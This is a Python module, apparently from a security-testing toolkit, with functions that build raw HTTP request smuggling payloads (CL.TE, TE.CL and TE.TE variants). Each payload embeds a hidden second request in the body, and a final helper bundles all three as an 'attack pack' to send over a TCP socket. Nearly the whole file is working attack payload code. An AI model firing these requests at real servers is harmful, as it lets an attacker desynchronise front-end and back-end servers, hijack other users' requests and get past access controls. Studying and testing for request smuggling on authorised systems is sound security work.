"""
HTTP request smuggling probes (CL.TE / TE.CL / TE.TE).

Builds raw HTTP request strings that the caller can pump through a TCP
socket (use the existing ``socket_user`` template). Detection requires
the operator to compare responses against a control request.
"""

from typing import Dict


def build_cl_te(host: str, path: str = "/") -> str:
    """Classic Content-Length / Transfer-Encoding mismatch payload."""
    body = (
        "0\r\n"
        "\r\n"
        "SMUGGLED GET / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
    )
    return headers + body


def build_te_cl(host: str, path: str = "/") -> str:
    """TE.CL variant — front-end honours TE, back-end honours CL."""
    body = (
        "5b\r\n"
        "GPOST / HTTP/1.1\r\n"
        "Content-Length: 6\r\n"
        "\r\n"
        "x=1\r\n"
        "0\r\n"
        "\r\n"
    )
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
    )
    return headers + body


def build_te_te(host: str, path: str = "/") -> str:
    """TE.TE — duplicate / obfuscated Transfer-Encoding header."""
    body = (
        "0\r\n"
        "\r\n"
        "SMUGGLED HEAD / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "\r\n"
    )
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Transfer-Encoding: chunked\r\n"
        "Transfer-encoding: x-chunked\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
    )
    return headers + body


def smuggling_attack_pack(host: str, path: str = "/") -> Dict[str, str]:
    """Return a dict of attack-name → raw HTTP request payload."""
    return {
        "cl_te": build_cl_te(host, path),
        "te_cl": build_te_cl(host, path),
        "te_te": build_te_te(host, path),
    }
